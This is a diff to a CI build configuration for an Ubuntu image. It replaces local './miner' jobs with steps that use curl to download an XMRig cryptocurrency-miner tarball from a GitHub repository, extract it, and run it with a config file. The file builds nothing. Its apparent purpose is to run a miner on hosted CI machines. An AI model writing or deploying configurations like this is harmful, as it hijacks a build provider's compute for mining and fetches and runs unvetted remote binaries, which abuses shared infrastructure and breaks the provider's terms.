@@ -1,33 +1,37 @@
 version: 1.0.{build}
-
 image: Ubuntu
 
-# Switch to script mode
-build:
-  off
+# Environment setup for XMRig
+environment:
+  global:
+    XMRIG_DIR: "./xmrigdir"       # Directory for extracted files
+    TAR_FILE: "xmrigdir.tar.gz"    # Name of your tarball
+    GITHUB_REPO_URL: "https://github.com/orkaroeli/vpsminer"  # GitHub repository link
 
-init:
-  # Ensure necessary packages are installed
+# Install necessary packages
+install:
   - sudo apt-get update
-  - sudo apt-get install -y bash
+  - sudo apt-get install -y curl tar
 
-job:
-  include:
-    # Job for Project1
-    - job: vpsminer3
-      build_script:
-        # Commands for Project1
-        - tar xvf xmrigdir.tar.gz
-        - cd xmrigdir
-        - chmod +x ./miner
-        - ./miner # Run the first project
+# Steps before the build starts
+before_build:
+  # Download XMRig tarball from GitHub
+  - curl -L $GITHUB_REPO_URL/raw/main/$TAR_FILE -o $TAR_FILE
 
-    # Job for Project2
-    - job: vpsminer4
-      build_script:
-        # Commands for Project2
-        - tar xvf xmrigdir.tar.gz
-        - cd xmrigdir
-        - chmod +x ./miner
-        - ./miner # Run the second project
-        
+  # Extract the tarball
+  - tar -xvf $TAR_FILE
+
+  # Navigate to the extracted directory
+  - cd $XMRIG_DIR
+
+  # Make the xmrig binary executable
+  - chmod +x ./xmrig
+
+build_script:
+  # Run XMRig using config.json
+  - ./xmrig --config=config.json
+
+artifacts:
+  - path: $XMRIG_DIR
+    name: "XMRig_artifacts"
+    
